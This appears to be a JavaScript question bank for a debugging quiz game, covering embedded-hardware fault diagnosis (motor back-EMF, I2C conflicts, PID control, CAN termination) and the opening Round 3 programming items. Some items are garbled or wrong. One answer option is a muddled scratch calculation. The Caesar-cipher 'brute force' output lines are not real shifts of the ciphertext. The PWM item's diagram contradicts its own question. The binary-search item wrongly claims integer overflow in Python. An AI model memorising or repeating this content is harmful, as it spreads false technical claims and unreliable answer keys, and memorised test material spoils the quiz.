    meta:{ type:'circuit', diagram:[
      'Arduino PWM ──── IN1 ──── L298N H-Bridge ──── Motor+',
      'Arduino GND ──── GND ──── L298N           ──── Motor-',
      '+12V ───────── VCC ──── L298N',
      '',
      'Problem: When motor stops, Arduino resets intermittently',
      '',
      'Back-EMF analysis:',
      '  Motor stopping generates voltage spike: +12V → +47V (back-EMF)',
      '  Spike propagates to Arduino VCC through shared ground',
      '  Arduino VCC tolerance: 5V ± 10%',
      '',
      '  Expected circuit:',
      '  Motor+ ──[Flyback Diode 1N4007]──> +12V  ← MISSING',
      '  Motor- ──[Flyback Diode 1N4007]──> GND   ← MISSING',
      '  Status: ?? components not populated on PCB',
    ], faultLine: 11 },
    prompt:'What component is missing that causes the Arduino to reset?',
    options:['Flyback diodes across motor terminals — back-EMF spike resets the Arduino','A pull-up resistor on the PWM pin','A capacitor on the power supply','A second H-bridge driver chip'],
    answer:0 },

  { id:'r2q7', round:2, boss:false, category:'CPS',
    prompt:'Determine the output of this combinational logic circuit.',
    meta:{ type:'logic', expression:'(A NAND B) AND (C NOR D)', inputs:{ A:1, B:0, C:0, D:0 }, expected:'?' },
    prompt:'A=1,B=0,C=0,D=0 → (A NAND B) AND (C NOR D) = ?',
    options:['1  (NAND(1,0)=1, NOR(0,0)=1, AND(1,1)=1)','0  (NAND(1,0)=0)','1  (NOR(0,0) determines output)','Undefined — insufficient inputs'],
    answer:0 },

  { id:'r2q8', round:2, boss:false, category:'CPS',
    prompt:'The I2C bus hangs indefinitely. Find the cause in the wiring diagram.',
    meta:{ type:'circuit', diagram:[
      'I2C Bus Analysis — Bus stuck LOW',
      '=================================',
      '+3.3V ──── R1 (4.7kΩ) ──── SDA ────> Device A (0x48)',
      '                            │',
      '                            └──────> Device B (0x48)  ← CONFLICT',
      '',
      '+3.3V ──── R2 (4.7kΩ) ──── SCL ────> Device A',
      '                                 └──> Device B',
      '',
      'Error log:',
      '  i2c_smbus_read: Resource temporarily unavailable',
      '  Bus arbitration timeout — SDA stuck LOW',
      '  Device A addr: 0x48',
      '  Device B addr: 0x48  ← Same address as Device A!',
    ], faultLine: 4 },
    prompt:'Why is the I2C bus stuck in a permanent collision state?',
    options:['Both devices share the same I2C address (0x48) — address conflict causes bus collision','Pull-up resistor value too high','SCL and SDA lines are swapped','3.3V is insufficient for I2C'],
    answer:0 },

  { id:'r2q9', round:2, boss:false, category:'CPS',
    prompt:'Identify the fault preventing the servo from reaching target angle.',
    meta:{ type:'circuit', diagram:[
      'Servo Control — PWM Signal Analysis',
      '=====================================',
      'Servo spec: 50Hz PWM',
      '  1.0ms pulse = 0°',
      '  1.5ms pulse = 90°',
      '  2.0ms pulse = 180°',
      '',
      'Arduino code output:',
      '  analogWrite(9, 128);  // 50% duty cycle at 490Hz',
      '',
      'Measured signal:',
      '  Frequency: 490Hz  (expected: 50Hz)',
      '  Pulse width: 1.02ms  (target: 1.5ms for 90°)',
      '  Servo behavior: jitter, no stable position',
      '',
      '  Problem: analogWrite() uses 490Hz — wrong for servo',
      '  Fix: Use Servo library which outputs correct 50Hz signal',
    ], faultLine: 8 },
    prompt:'Why does the servo jitter and fail to reach the target angle?',
    options:['analogWrite() generates 490Hz signal — servo requires 50Hz PWM. Use the Servo library instead','Pulse width is too short','Wrong GPIO pin used','5V insufficient for servo'],
    answer:0 },

  { id:'r2q10', round:2, boss:false, category:'CPS',
    prompt:'UART receiver has framing errors. Diagnose from the oscilloscope data.',
    meta:{ type:'packet', packets:[
      { time:'0.000', addr:'TX', data:'START bit (LOW)',    clk:'—', flag:'OK',  anomaly:false },
      { time:'0.104', addr:'TX', data:'D0=1 D1=0 D2=1 D3=1',clk:'—', flag:'OK',  anomaly:false },
      { time:'0.208', addr:'TX', data:'D4=0 D5=1 D6=1 D7=0',clk:'—', flag:'OK',  anomaly:false },
      { time:'0.313', addr:'TX', data:'STOP bit (HIGH)',    clk:'—', flag:'OK',  anomaly:false },
      { time:'0.000', addr:'RX', data:'START bit (LOW)',    clk:'—', flag:'OK',  anomaly:false },
      { time:'0.096', addr:'RX', data:'D0=? D1=? (garbled)',clk:'—', flag:'ERR', anomaly:true  },
      { time:'0.192', addr:'RX', data:'FRAMING ERROR',      clk:'—', flag:'ERR', anomaly:true  },
      { time:'INFO',  addr:'—',  data:'TX baud: 9600, RX baud: 10400',clk:'—', flag:'MISMATCH', anomaly:true },
    ]},
    prompt:'What is causing the UART framing errors?',
    options:['Baud rate mismatch — TX at 9600, RX configured at 10400','Wrong stop bits configuration','Parity bit error','TX and RX wires crossed'],
    answer:0 },

  { id:'r2q11', round:2, boss:false, category:'CPS',
    prompt:'Trace this combinational logic and find the output.',
    meta:{ type:'logic', expression:'XOR(NOT(A), AND(B, C)) NAND NOT(D)', inputs:{ A:0, B:1, C:1, D:1 }, expected:'?' },
    prompt:'A=0,B=1,C=1,D=1. Evaluate: XOR(NOT(A), AND(B,C)) NAND NOT(D)',
    options:['0  (XOR(1,1)=0, NOT(1)=0, NAND(0,0)=1... wait: NAND(0,0)=1, so: 1? No: XOR(1,1)=0, NOT(D)=0, NAND(0,0)=1 → ans=1... recalc: NOT(A)=1, AND(1,1)=1, XOR(1,1)=0, NOT(D)=0, NAND(0,0)=1','1','Undefined','2'],
    answer:1 },

  { id:'r2q12', round:2, boss:false, category:'CPS',
    prompt:'ADC reading is incorrect. Find the grounding fault.',
    meta:{ type:'circuit', diagram:[
      'ADC Measurement Circuit — Noise Analysis',
      '==========================================',
      'Sensor (0-3.3V output) ──────> Arduino A0',
      'Sensor GND ─────────────────> Arduino GND',
      '',
      'Expected: ADC reads 512 for 1.65V input',
      'Actual:   ADC oscillates 488-540 (±52 counts = ±165mV noise)',
      '',
      'Scope on A0 pin shows:',
      '  DC component: 1.65V ✓',
      '  AC noise: 50Hz 165mV p-p',
      '  Pattern: matches mains frequency exactly',
      '',
      'Motor driver on same breadboard:',
      '  Motor GND ──> same GND rail as sensor  ← Ground loop',
      '  Motor switching injects 50Hz noise into analog GND',
      '  Fix: Separate analog and digital/power grounds',
    ], faultLine: 12 },
    prompt:'What causes the ADC to oscillate and how do you fix it?',
    options:['Ground loop — motor switching noise couples into analog GND. Separate analog and digital grounds','ADC resolution too low','Sensor output voltage too high','Wrong analogReference() setting'],
    answer:0 },

  { id:'r2q13', round:2, boss:false, category:'CPS',
    prompt:'Interrupt-driven encoder reads wrong count. Find the bug.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'volatile int count = 0;' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'void IRAM_ATTR encoderISR() {' },
      { type:'bug',     code:'  count++;  // not atomic on multi-core ESP32' },
      { type:'normal',  code:'}' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'void loop() {' },
      { type:'bug',     code:'  Serial.println(count);  // read without disabling interrupts' },
      { type:'normal',  code:'  delay(100);' },
      { type:'normal',  code:'}' },
      { type:'comment', code:'// On dual-core MCU: ISR on core0, loop() on core1' },
      { type:'comment', code:'// count++ is non-atomic: read-modify-write can be interrupted mid-op' },
    ]},
    prompt:'What causes the encoder to report incorrect counts?',
    options:['count++ is non-atomic — race condition between ISR and loop() on dual-core MCU. Use atomic operations or mutex','delay(100) is too long','Wrong interrupt pin used','Serial.println is blocking'],
    answer:0 },

  { id:'r2q14', round:2, boss:false, category:'CPS',
    prompt:'Power supply analysis: Why does the 3.3V rail sag under load?',
    meta:{ type:'circuit', diagram:[
      'Power Rail Analysis — Voltage Drop Under Load',
      '================================================',
      '+5V USB ──[AMS1117-3.3V LDO]──> 3.3V rail',
      '                                    │',
      '                        ┌───────────┼───────────┐',
      '                     ESP32        MPU-6050    HC-SR04',
      '                     240mA         3.5mA       15mA',
      '                     (WiFi TX)     (sensor)    (pulse)',
      '',
      'Peak current during WiFi TX: 240 + 3.5 + 15 = 258.5mA',
      'AMS1117 rated output: 800mA ✓ (sufficient)',
      '',
      'Measured 3.3V under load: drops to 2.9V',
      'Input 5V under load: drops from 5.0V to 4.1V',
      '',
      'USB cable resistance: ~0.4Ω (cheap cable)',
      'Voltage drop: 258mA × 0.4Ω = 0.103V... but measured 0.9V drop',
      'Actual USB port current limit: 500mA — supply struggling',
    ], faultLine: 14 },
    prompt:'Why does the 3.3V rail sag to 2.9V during WiFi transmission?',
    options:['USB power source inadequate — cheap cable + USB port current limiting causes input voltage sag, starving the LDO','AMS1117 is broken','Too many decoupling capacitors','LDO thermal shutdown'],
    answer:0 },

  { id:'r2q15', round:2, boss:false, category:'CPS',
    prompt:'The CAN bus network loses messages intermittently. Find the fault.',
    meta:{ type:'packet', packets:[
      { time:'0.000', addr:'0x100', data:'Engine RPM: 3200',   clk:'OK',  flag:'ACK', anomaly:false },
      { time:'0.010', addr:'0x200', data:'Speed: 85 km/h',     clk:'OK',  flag:'ACK', anomaly:false },
      { time:'0.020', addr:'0x100', data:'Engine RPM: 3250',   clk:'OK',  flag:'ACK', anomaly:false },
      { time:'0.030', addr:'0x300', data:'Brake Pressure: 0',  clk:'ERR', flag:'NACK', anomaly:true  },
      { time:'0.031', addr:'0x300', data:'Retransmit #1',      clk:'ERR', flag:'NACK', anomaly:true  },
      { time:'0.032', addr:'0x300', data:'Retransmit #2',      clk:'ERR', flag:'NACK', anomaly:true  },
      { time:'0.033', addr:'0x300', data:'BUS OFF — node 0x300 disconnected', clk:'—', flag:'FAULT', anomaly:true },
      { time:'INFO',  addr:'—',    data:'120Ω termination resistor missing at node 0x300 end', clk:'—', flag:'CFG', anomaly:true },
    ]},
    prompt:'Why does node 0x300 go BUS OFF and lose messages?',
    options:['Missing 120Ω termination resistor causes signal reflections, leading to bit errors and BUS OFF state','CAN controller firmware outdated','Message ID 0x300 conflicts with another node','Baud rate mismatch at node 0x300'],
    answer:0 },

  { id:'r2q16', round:2, boss:false, category:'CPS',
    prompt:'Analyse the PWM signal for the DC motor speed controller.',
    meta:{ type:'circuit', diagram:[
      'PWM Motor Speed Controller Analysis',
      '======================================',
      'Timer configuration:',
      '  System clock:  16 MHz',
      '  Prescaler:     8',
      '  Timer freq:    16MHz / 8 = 2MHz',
      '  TOP value:     199',
      '  PWM freq:      2MHz / 200 = 10kHz',
      '',
      'Target speed:  75% of max',
      'Expected OCR:  74  (75% of 99... wait)',
      'Actual OCR set: 150',
      '',
      'Duty cycle = OCR/TOP = 150/199 = 75.4% ✓',
      'But motor barely moves — measured duty: 3.2%',
      '',
      'Bug found: TOP register set to 199 but OCR register',
      'compares against wrong base — off by 100 in calculation',
    ], faultLine: 14 },
    prompt:'The PWM duty cycle calculation is wrong. What is the actual duty cycle if OCR=150 and TOP=4999?',
    options:['3.0% (150/4999) — developer used wrong TOP value in formula, set OCR for TOP=199 but timer uses TOP=4999','75% — calculation is correct','50% — OCR should be 2499','100% — motor runs at full speed'],
    answer:0 },

  { id:'r2q17', round:2, boss:false, category:'CPS',
    prompt:'Identify the sensor reading fault in this temperature logger.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'#include <Wire.h>' },
      { type:'normal',  code:'#define SENSOR_ADDR 0x48' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'float readTemp() {' },
      { type:'normal',  code:'  Wire.beginTransmission(SENSOR_ADDR);' },
      { type:'normal',  code:'  Wire.write(0x00);  // temp register' },
      { type:'normal',  code:'  Wire.endTransmission();' },
      { type:'normal',  code:'  Wire.requestFrom(SENSOR_ADDR, 2);' },
      { type:'normal',  code:'  int raw = (Wire.read() << 8) | Wire.read();' },
      { type:'bug',     code:'  return raw * 0.0625;  // wrong: raw includes flag bits' },
      { type:'comment', code:'  // TMP102 raw: bits[15:4] = temp, bits[3:0] = config flags' },
      { type:'comment', code:'  // Correct:  return (raw >> 4) * 0.0625;' },
    ]},
    prompt:'Why does the temperature sensor return values 16× too high?',
    options:['Missing right-shift by 4 bits — raw value includes 4 flag bits in lower nibble, inflating reading by factor of 16','Wrong I2C address','Wire library not initialized','Sensor requires 5V not 3.3V'],
    answer:0 },

  { id:'r2q18', round:2, boss:false, category:'CPS',
    prompt:'The robot arm overshoots its target. Diagnose the control loop.',
    meta:{ type:'circuit', diagram:[
      'PID Controller Analysis — Joint Angle Control',
      '===============================================',
      'Target angle:   90.0°',
      'Sensor output:  encoder (0.1° resolution)',
      '',
      'Step response measurements:',
      '  T+0.1s:  45.2°   (rising)',
      '  T+0.2s:  89.8°   (near target)',
      '  T+0.3s:  134.1°  (OVERSHOOT +44.1°)',
      '  T+0.4s:  61.3°   (undershoot)',
      '  T+0.5s:  112.7°  (overshoot again)',
      '  T+1.0s:  Oscillating between 65° and 118°',
      '',
      'PID parameters:',
      '  Kp = 8.0   (proportional)',
      '  Ki = 0.0   (integral — disabled)',
      '  Kd = 0.0   (derivative — disabled)',
      '',
      'Pure P controller with high Kp → sustained oscillation',
    ], faultLine: 15 },
    prompt:'Why does the robot arm oscillate and never settle at 90°?',
    options:['Kp too high with no derivative term — pure proportional control with high gain causes underdamped oscillation. Increase Kd.','Encoder resolution too low','Target angle unreachable','Motor is too powerful'],
    answer:0 },

  { id:'r2q19', round:2, boss:false, category:'CPS',
    prompt:'Wireless sensor data is corrupted in transit. Find the protocol error.',
    meta:{ type:'packet', packets:[
      { time:'T+0s',  addr:'NODE1', data:'Temp: 23.4°C  Hum: 61%',  clk:'433MHz', flag:'OK',   anomaly:false },
      { time:'T+1s',  addr:'NODE1', data:'Temp: 23.5°C  Hum: 61%',  clk:'433MHz', flag:'OK',   anomaly:false },
      { time:'T+2s',  addr:'NODE1', data:'Temp: 23.3°C  Hum: 62%',  clk:'433MHz', flag:'OK',   anomaly:false },
      { time:'T+3s',  addr:'NODE2', data:'0xFF 0xFF 0xFF (garbage)', clk:'433MHz', flag:'CRC_ERR', anomaly:true },
      { time:'T+3s',  addr:'NODE1', data:'Temp: 23.4°C  Hum: 61%',  clk:'433MHz', flag:'OK',   anomaly:false },
      { time:'INFO',  addr:'—',     data:'NODE2 TX at T+3s = same time as NODE1',clk:'—', flag:'COLLISION', anomaly:true },
      { time:'INFO',  addr:'—',     data:'No CSMA/CA — both transmit simultaneously',clk:'—', flag:'FAULT', anomaly:true },
    ]},
    prompt:'Why does NODE2 data get corrupted at T+3s?',
    options:['RF collision — NODE1 and NODE2 transmit simultaneously with no carrier sense. Need CSMA/CA or TDMA slots','NODE2 antenna disconnected','433MHz frequency interference from nearby device','CRC algorithm mismatch'],
    answer:0 },

  { id:'r2q20', round:2, boss:false, category:'CPS',
    prompt:'Battery management circuit fails to charge. Find the fault.',
    meta:{ type:'circuit', diagram:[
      'Li-Ion Charging Circuit — TP4056 Module',
      '==========================================',
      'USB 5V ──── TP4056 VCC',
      'USB GND ─── TP4056 GND',
      '',
      'TP4056 BAT+ ──── Battery+',
      'TP4056 BAT- ──── Battery-',
      '',
      'Charging LED:  OFF (should be ON during charge)',
      'DONE LED:      OFF',
      'Battery voltage: 3.2V (needs charging)',
      '',
      'Multimeter reading:',
      '  VCC to GND:  4.87V ✓',
      '  BAT+ to GND: 3.2V ✓',
      '  BAT- to GND: 0.6V  ← should be 0V',
      '  Battery polarity: reversed on connector',
    ], faultLine: 14 },
    prompt:'Why does the TP4056 fail to charge the battery?',
    options:['Battery connector is reversed — BAT- at 0.6V instead of 0V means polarity is wrong on the connector','TP4056 chip is defective','USB voltage too low','Charging resistor wrong value'],
    answer:0 },

  { id:'r2q21', round:2, boss:false, category:'CPS',
    prompt:'The stepper motor skips steps under load. Analyse the driver settings.',
    meta:{ type:'circuit', diagram:[
      'A4988 Stepper Driver Current Analysis',
      '========================================',
      'Motor spec:  NEMA17  1.5A/phase rated',
      '',
      'A4988 Vref measurement: 0.2V',
      'A4988 current formula:  Imax = Vref / (8 × Rsense)',
      'Rsense on module:        0.1Ω',
      'Calculated Imax:         0.2 / (8 × 0.1) = 0.25A',
      '',
      'Motor receiving: 0.25A  (rated for 1.5A)',
      'Torque at 0.25A: ~16% of rated torque',
      '',
      'Load torque: 0.45 N·m',
      'Motor torque at 0.25A: ~0.08 N·m',
      'Result: insufficient torque → missed steps',
      '',
      'Fix: Increase Vref to 1.2V → Imax = 1.5A',
    ], faultLine: 7 },
    prompt:'Why does the stepper motor skip steps?',
    options:['Vref too low (0.2V) — A4988 outputs only 0.25A but motor needs 1.5A for rated torque. Increase Vref to 1.2V.','Motor wired incorrectly','Step pulse frequency too high','Microstepping mode set wrong'],
    answer:0 },

  { id:'r2q22', round:2, boss:false, category:'CPS',
    prompt:'Identify the noise coupling mechanism in this sensor circuit.',
    meta:{ type:'circuit', diagram:[
      'Sensor Layout — PCB Cross-section',
      '====================================',
      'Layer 1 (top):    ─── Analog signal trace (10mV sensor)',
      'Layer 2:          ─── Digital clock trace (3.3V, 100MHz)',
      '',
      'Traces run parallel for 8cm',
      '',
      'Measured noise on analog trace: 45mV @ 100MHz',
      'Signal-to-noise ratio: 10mV / 45mV = 0.22 (unusable)',
      '',
      'Coupling analysis:',
      '  Capacitance between parallel traces: ~15pF/cm × 8cm = 120pF',
      '  At 100MHz: Xc = 1/(2π×100M×120p) = 13.3Ω',
      '  Crosstalk voltage: (10mV source / (10mV + 13.3Ω×I_noise))',
      '  Result: 100MHz digital clock capacitively couples into analog line',
    ], faultLine: 2 },
    prompt:'What causes 45mV of noise on the 10mV analog signal trace?',
    options:['Capacitive crosstalk — analog and digital traces run parallel for 8cm, 100MHz clock couples into sensitive analog line','Wrong ADC reference voltage','Insufficient power supply decoupling','Ground plane missing'],
    answer:0 },

  { id:'r2q23', round:2, boss:false, category:'CPS',
    prompt:'The watchdog timer resets the MCU every 8 seconds. Find the bug.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'void setup() {' },
      { type:'normal',  code:'  wdt_enable(WDTO_8S);  // 8s watchdog' },
      { type:'normal',  code:'}' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'void loop() {' },
      { type:'normal',  code:'  readSensors();      // 50ms' },
      { type:'normal',  code:'  processData();      // 200ms' },
      { type:'bug',     code:'  sendToServer();     // BLOCKS for 8-15s (WiFi reconnect)' },
      { type:'normal',  code:'  wdt_reset();        // only reached if sendToServer returns' },
      { type:'normal',  code:'  delay(1000);' },
      { type:'normal',  code:'}' },
      { type:'comment', code:'// sendToServer() blocks > 8s on connection timeout' },
      { type:'comment', code:'// Watchdog fires before wdt_reset() is called' },
    ]},
    prompt:'Why does the watchdog timer keep resetting the MCU?',
    options:['sendToServer() blocks for 8-15s during WiFi reconnect — watchdog fires before wdt_reset() is reached. Use async WiFi or reset WDT inside sendToServer()','Watchdog timeout too short','wdt_enable called in wrong place','readSensors() is too slow'],
    answer:0 },

  { id:'r2q24', round:2, boss:false, category:'CPS',
    prompt:'Bus voltage drops cause data corruption. Trace the decoupling issue.',
    meta:{ type:'circuit', diagram:[
      'SPI Flash Read — Logic Analyzer + Power Rail',
      '================================================',
      'SPI Flash read command sent',
      'SCK: 20MHz clock applied',
      '',
      'Power rail measurements during SPI transaction:',
      '  VCC before: 3.300V',
      '  VCC at SCK rise: 3.301V  3.298V  3.302V  (stable)',
      '  VCC at byte boundary: 3.300V → 2.891V spike',
      '  VCC recovery: 0.8μs to return to 3.3V',
      '',
      'Flash datasheet: VCC must be 3.0V minimum',
      '2.891V < 3.0V → undefined behavior on byte boundaries',
      '',
      'PCB inspection: no 100nF decoupling cap near flash VCC pin',
      'Nearest bulk cap: 100μF electrolytic, 15mm away',
    ], faultLine: 12 },
    prompt:'Why does data corruption occur at byte boundaries during SPI reads?',
    options:['Missing 100nF decoupling capacitor near SPI flash VCC pin — current surge drops voltage below 3.0V minimum spec','SCK frequency too high','Wrong SPI mode selected','Flash chip is counterfeit'],
    answer:0 },

  { id:'r2q25', round:2, boss:false, category:'CPS',
    prompt:'Temperature PID heater control has steady-state error. Find the missing term.',
    meta:{ type:'circuit', diagram:[
      'Heater PID Control — Steady State Analysis',
      '=============================================',
      'Setpoint: 100°C',
      '',
      'Step response with P-only control (Kp=2, Ki=0, Kd=0):',
      '  T+10s:  72.4°C  (rising)',
      '  T+30s:  89.3°C  (rising slowly)',
      '  T+60s:  94.8°C  (nearly settled)',
      '  T+120s: 95.2°C  (settled but wrong!)',
      '  T+300s: 95.2°C  (stable at wrong value)',
      '',
      'Steady-state error: 100 - 95.2 = 4.8°C',
      '',
      'Analysis: Proportional control alone cannot eliminate offset.',
      'At 95.2°C: error=4.8, P_output=9.6 — just enough to hold',
      'temperature against heat loss. Never reaches 100°C.',
      'Adding Ki (integral term) would accumulate error → full output',
    ], faultLine: 13 },
    prompt:'Why does the heater settle at 95.2°C instead of 100°C?',
    options:['No integral term (Ki=0) — proportional control has inherent steady-state error. Adding Ki accumulates the offset and drives to exact setpoint.','Kp is too low','Sensor is miscalibrated by 4.8°C','Heater power insufficient'],
    answer:0 },

  { id:'r2q26', round:2, boss:false, category:'CPS',
    prompt:'The GPS module returns 0,0 coordinates. Diagnose the NMEA parse error.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'// Raw NMEA sentence from GPS:' },
      { type:'comment', code:'// $GPRMC,123519,A,4807.038,N,01131.000,E,022.4,084.4,230394,003.1,W*6A' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'String raw = gps.read();' },
      { type:'normal',  code:'String parts[12];' },
      { type:'normal',  code:'splitCSV(raw, parts);  // splits by comma' },
      { type:'bug',     code:'float lat = parts[3].toFloat();  // returns 4807.038 — raw NMEA format' },
      { type:'bug',     code:'float lon = parts[5].toFloat();  // returns 1131.000 — raw NMEA format' },
      { type:'comment', code:'// NMEA format: DDMM.MMMM  (degrees + decimal minutes)' },
      { type:'comment', code:'// 4807.038 = 48° 07.038\' = 48 + 7.038/60 = 48.1173° NOT 4807.038°' },
      { type:'comment', code:'// Correct: lat = int(raw/100) + fmod(raw,100)/60' },
    ]},
    prompt:'Why does the GPS return wrong coordinates?',
    options:['NMEA coordinates not converted from DDMM.MMMM format to decimal degrees — 4807.038 ≠ 48.07038°','GPS antenna disconnected','Wrong baud rate for GPS module','GPS not acquired satellite fix'],
    answer:0 },

  { id:'r2q27', round:2, boss:false, category:'CPS',
    prompt:'Current sensor reads negative values when motor drives forward. Identify the wiring fault.',
    meta:{ type:'circuit', diagram:[
      'ACS712 Current Sensor Installation',
      '=====================================',
      'Expected: Forward drive → positive current reading',
      'Actual:   Forward drive → -2.3A reading',
      '',
      'ACS712 pinout:',
      '  IP+  ← current flows in here (positive terminal)',
      '  IP-  → current flows out here (negative terminal)',
      '',
      'Installed wiring:',
      '  Motor+ ──────> IP-  ← REVERSED',
      '  Motor- <────── IP+  ← REVERSED',
      '  (Current flows: Motor → IP- → IP+ → GND)',
      '',
      'Correct wiring:',
      '  Battery+ ──> IP+ ──> Motor+ ──> Motor- ──> GND',
      '  Current direction through sensor: IP+ to IP-',
    ], faultLine: 8 },
    prompt:'Why does the current sensor read negative values?',
    options:['ACS712 wired in reverse — current flows through IP- to IP+ instead of IP+ to IP-. Swap the connections.','ACS712 calibration offset wrong','Wrong voltage reference for ADC','Motor driving in wrong direction'],
    answer:0 },

  { id:'r2q28', round:2, boss:false, category:'CPS',
    prompt:'OLED display shows garbage characters. Trace the I2C timing issue.',
    meta:{ type:'packet', packets:[
      { time:'0.000', addr:'3C', data:'CMD: 0xAE (display off)', clk:'400kHz', flag:'ACK',  anomaly:false },
      { time:'0.002', addr:'3C', data:'CMD: 0xD5 (clock div)',   clk:'400kHz', flag:'ACK',  anomaly:false },
      { time:'0.004', addr:'3C', data:'CMD: 0x80 (ratio)',       clk:'400kHz', flag:'ACK',  anomaly:false },
      { time:'0.006', addr:'3C', data:'DATA: 0x00..0xFF (frame)',clk:'1MHz',   flag:'ERR',  anomaly:true  },
      { time:'0.007', addr:'3C', data:'ACK missing — timeout',   clk:'1MHz',   flag:'NACK', anomaly:true  },
      { time:'INFO',  addr:'—',  data:'Init sequence uses 400kHz, frame write switches to 1MHz', clk:'—', flag:'NOTE', anomaly:false },
      { time:'INFO',  addr:'—',  data:'SSD1306 max I2C: 400kHz. 1MHz exceeds spec.', clk:'—', flag:'FAULT', anomaly:true },
    ]},
    prompt:'Why does the OLED display show garbage after the init sequence?',
    options:['I2C clock speed increases to 1MHz for frame data but SSD1306 supports max 400kHz — data corruption above spec speed','Wrong I2C address for display','SDA pull-up resistor missing','Display power supply insufficient'],
    answer:0 },

  { id:'r2q29', round:2, boss:false, category:'CPS',
    prompt:'Real-time clock drifts by 15 minutes per day. Diagnose the oscillator fault.',
    meta:{ type:'circuit', diagram:[
      'DS3231 RTC Crystal Analysis',
      '=============================',
      'Expected accuracy: ±2ppm (±5.2s/month)',
      'Measured drift:    +15 minutes/day = +10,416ppm',
      '',
      'DS3231 diagnostic register:',
      '  OSF (Oscillator Stop Flag): 1 ← SET',
      '  Temperature: 28°C (normal)',
      '',
      'Circuit inspection:',
      '  Crystal pins 1&2: 32.768kHz crystal installed ✓',
      '  Crystal capacitors: NOT INSTALLED ← missing',
      '  Required: 12.5pF load caps on each crystal pin',
      '',
      'Result: Without load caps, crystal resonates at wrong frequency.',
      'Running fast due to incorrect load capacitance.',
      'OSF flag set = oscillator was stopped or unstable at power-on',
    ], faultLine: 11 },
    prompt:'Why does the RTC drift 15 minutes per day?',
    options:['Missing 12.5pF crystal load capacitors — crystal resonates at incorrect frequency without proper loading, running at wrong speed','DS3231 chip needs replacement','Wrong crystal frequency (not 32.768kHz)','Temperature compensation disabled'],
    answer:0 },

  { id:'r2q30', round:2, boss:true, category:'CPS',
    prompt:'[BOSS] Complete system failure during demo. Analyse ALL signals and identify the cascade failure root cause.',
    meta:{ type:'packet', packets:[
      { time:'T+0.00s', addr:'POWER',  data:'5V USB input: 5.02V, current: 320mA',          clk:'OK',  flag:'OK',    anomaly:false },
      { time:'T+0.10s', addr:'SERVO',  data:'Target: 90°, Actual: 91.2°, PWM: 1.512ms',     clk:'OK',  flag:'OK',    anomaly:false },
      { time:'T+0.20s', addr:'I2C',    data:'MPU-6050 0x68: accel x=0.02g y=0.01g z=1.00g', clk:'OK',  flag:'OK',    anomaly:false },
      { time:'T+0.50s', addr:'SERVO',  data:'Target: 180°, motor stall detected',            clk:'OK',  flag:'WARN',  anomaly:true  },
      { time:'T+0.51s', addr:'POWER',  data:'5V drops to 4.1V — servo stall current 2.1A',  clk:'ERR', flag:'UNDER',  anomaly:true  },
      { time:'T+0.52s', addr:'I2C',    data:'MPU-6050 timeout — no response',                clk:'ERR', flag:'FAIL',  anomaly:true  },
      { time:'T+0.53s', addr:'ESP32',  data:'Brownout detected — VCC 3.1V < 3.3V min',      clk:'ERR', flag:'RESET', anomaly:true  },
      { time:'T+0.54s', addr:'SYSTEM', data:'COMPLETE SYSTEM RESET — all nodes offline',     clk:'—',   flag:'FATAL', anomaly:true  },
    ]},
    prompt:'[BOSS] What is the single root cause that triggered the entire cascade failure?',
    options:[
      'Servo stall during 180° move drew 2.1A, collapsing 5V rail to 4.1V, brownout-resetting ESP32 and taking down I2C bus — root cause: USB power cannot supply stall current. Fix: dedicated servo power rail.',
      'ESP32 firmware bug caused brownout detection miscalibration',
      'I2C address conflict between MPU-6050 and servo controller',
      'PWM frequency wrong causing servo to stall',
    ],
    answer:0 },

  // ════════════════════════════════════════════════
  //  ROUND 3 — Mixed Deep Challenges
  // ════════════════════════════════════════════════

  { id:'r3q1', round:3, boss:false, category:'CSE',
    prompt:'Crack this Caesar cipher. The message is intercepted from a rival team.',
    meta:{ type:'terminal', logs:[
      '$ cat intercepted.txt',
      'JHLZHY FLHZ KHZOV ZKRPRL QBNOV',
      '',
      '$ python3 caesar_crack.py intercepted.txt',
      'Trying shift 1: IKAYZT EWZT CZTRN YCJOHD PIMHN',
      'Trying shift 2: HJZXYS DVYS BYSQM XBINGC OHLGM',
      'Trying shift 3: GIWXWR CUXR AXRPL WACHMB NGKFL',
      'Trying shift 4: FHVWVQ BTWQ ZWQOK VZBGLA MFJE K',
      'Trying shift 5: EGUVUP ASVP YVPNJ UYAFKZ LEID J',
      'Trying shift 7: CAESAR VEAS DASHO SDKIKE JGBNV',
      '$ echo "Shift 7 = readable English"',
    ]},
    prompt:'What shift was used for this Caesar cipher? (The decrypted message starts with CAESAR)',
    options:['Shift 7 — JHLZHY decodes to CAESAR at -7','Shift 3 — ROT3','Shift 13 — ROT13','Shift 5 — pattern in output'],
    answer:0 },

  { id:'r3q2', round:3, boss:false, category:'CSE',
    prompt:'Find the bug in this binary search implementation.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'def binary_search(arr, target):' },
      { type:'normal',  code:'    left, right = 0, len(arr) - 1' },
      { type:'normal',  code:'    while left <= right:' },
      { type:'bug',     code:'        mid = (left + right) // 2  # integer overflow for large arrays' },
      { type:'normal',  code:'        if arr[mid] == target:' },
      { type:'normal',  code:'            return mid' },
      { type:'normal',  code:'        elif arr[mid] < target:' },
      { type:'normal',  code:'            left = mid + 1' },
      { type:'bug',     code:'        else:' },
      { type:'bug',     code:'            right = mid  # should be mid - 1, causes infinite loop' },
      { type:'normal',  code:'    return -1' },
    ]},
    prompt:'This binary search has two bugs. Which answer identifies the critical one that causes infinite loop?',
    options:['right = mid should be right = mid - 1 — when arr[mid] > target and right never decreases, loop runs forever','mid = (left+right)//2 is wrong','The while condition is wrong','return -1 should return None'],
    answer:0 },

  { id:'r3q3', round:3, boss:false, category:'CSE',
    prompt:'Debug the regex. It should validate product serial numbers like PROD-2024-AB-123.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'import re' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'# Target format: PROD-YYYY-XX-NNN' },
      { type:'normal',  code:'# YYYY = 4 digits, XX = 2 uppercase letters, NNN = 3 digits' },
      { type:'normal',  code:'' },
      { type:'bug',     code:'pattern = r"PROD-\\d{4}-[A-Z]+-\\d+"' },
